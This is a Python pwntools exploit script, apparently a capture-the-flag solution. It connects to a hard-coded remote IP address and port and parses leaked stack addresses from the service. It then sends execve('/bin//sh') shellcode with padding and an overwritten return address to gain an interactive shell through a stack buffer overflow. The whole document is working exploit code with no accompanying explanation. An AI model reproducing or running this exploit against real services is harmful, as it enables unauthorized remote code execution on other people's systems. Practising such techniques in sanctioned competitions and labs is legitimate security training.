import struct
from pwn import *

io =  remote('107.21.135.41', 5555)

shellcode = b"\x48\x31\xd2" + \
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + \
    b"\x48\xc1\xeb\x08" + \
    b"\x53" + \
    b"\x48\x89\xe7" + \
    b"\x50" + \
    b"\x57" + \
    b"\x48\x89\xe6" + \
    b"\xb0\x3b" + \
    b"\x0f\x05"

io.recvuntil(b'base pointer: ')
bp = int(io.recvline(keepends=False),16)

io.recvuntil(b'will be stored: ')
buf = int(io.recvline(keepends=False),16)

# io.recvuntil(b'libc: ')
# lib_c = int(io.recvline(keepends=False),16)

padding = bp - buf + 8 
ret_addr = bp + 8

# s =  b'a'*padding + struct.pack("<Q",buf) + shellcode 
s =  shellcode + b'a'* (padding - len(shellcode))+ struct.pack("<Q",buf)  

io.sendline(s)
io.interactive()